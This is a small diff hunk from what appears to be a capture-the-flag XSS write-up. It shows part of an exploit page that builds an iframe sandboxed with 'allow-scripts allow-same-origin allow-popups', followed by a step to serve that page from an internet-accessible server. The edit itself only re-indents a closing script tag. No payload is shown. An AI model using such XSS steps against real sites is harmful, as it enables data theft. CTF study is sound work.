@@ -74,7 +74,7 @@ Here the step to get xss and steal the flag
     */
     i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
     document.body.appendChild(i1)
-</script>
+    </script>
 '''
 
 2.Serve the page using a web server, make sure the server is accessible from the internet.
